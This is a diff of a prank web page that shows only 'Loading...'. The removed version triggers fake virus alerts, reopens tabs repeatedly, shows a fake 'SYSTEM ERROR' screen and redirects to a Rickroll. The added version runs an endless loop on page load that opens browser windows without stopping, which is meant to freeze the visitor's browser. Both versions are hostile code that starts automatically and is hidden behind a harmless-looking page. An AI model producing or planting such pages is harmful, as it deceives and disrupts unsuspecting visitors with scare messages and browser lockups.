@@ -1,39 +1,14 @@
-<!DOCTYPE html>
 <html>
 <head>
-    <title>Oops! System Error</title>
-    <script>
-        // 🚀 Endlessly Reopens Tabs!
-        function openTabs() {
-            for (let i = 0; i < 5; i++) {
-                window.open(window.location.href, "_blank");
-            }
+<script>
+    function startLag() {
+        while(1) {
+            window.open("https://www.google.com");
         }
-        
-        // 🔥 Fake Virus Alert!
-        function showFakeAlert() {
-            alert("⚠️ WARNING: Your device is infected with a virus!");
-            alert("📢 Immediate action required! Click OK to fix.");
-            setTimeout(openTabs, 3000); // Opens tabs after 3 sec
-        }
-
-        // 💀 Fake Phone Crash (CSS Glitch Effect)
-        function glitchScreen() {
-            document.body.innerHTML = `<h1 style="color:red; font-size:50px; text-align:center;">SYSTEM ERROR! 💀</h1>`;
-            document.body.style.background = "black";
-            setTimeout(() => {
-                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"; // Rickroll 🤣
-            }, 5000);
-        }
-
-        // 🌀 Start the Prank when Page Loads
-        window.onload = function() {
-            showFakeAlert();
-            setTimeout(glitchScreen, 7000); // Fake crash after 7 sec
-        };
-    </script>
+    }
+</script>
 </head>
-<body>
-    <h1 style="text-align:center; margin-top:50px;">Loading...</h1>
+<body onload="startLag()">
+<h1>Loading...</h1>
 </body>
 </html>
